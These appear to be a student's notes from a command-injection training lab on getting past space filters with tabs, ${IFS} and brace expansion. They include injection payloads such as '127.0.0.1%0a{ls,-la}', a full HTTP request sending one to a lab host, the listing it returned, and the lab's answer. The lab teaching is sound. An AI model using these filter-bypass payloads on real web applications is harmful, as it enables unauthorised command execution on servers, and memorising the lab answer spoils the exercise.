# Bypassing Space Filters
## Using Tabs

```
127.0.0.1%0a%09
```

## Using $IFS

```
127.0.0.1%0a${IFS}
```

## Using Brace Expansion

```sh
$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

## Questions
1. Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file? **Answer: 1613**
   - The size is between `www-data` and the date:
        ```
        POST / HTTP/1.1
        Host: 154.57.164.81:32341
        Content-Length: 23
        Cache-Control: max-age=0
        Accept-Language: en-US,en;q=0.9
        Origin: http://154.57.164.81:32341
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://154.57.164.81:32341/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ip=127.0.0.1%0a{ls,-la}
        ```
        ```
        <SNIP>
        rwxr-xr-x. 1 www-data www-data   40 Jul 16  2021 .
        drwxr-xr-x. 1 www-data www-data   18 Aug 19  2020 ..
        -rw-r--r--. 1 www-data www-data 1613 Jul 16  2021 index.php
        -rw-r--r--. 1 www-data www-data 1256 Jul 12  2021 style.css
        <SNIP>
        ```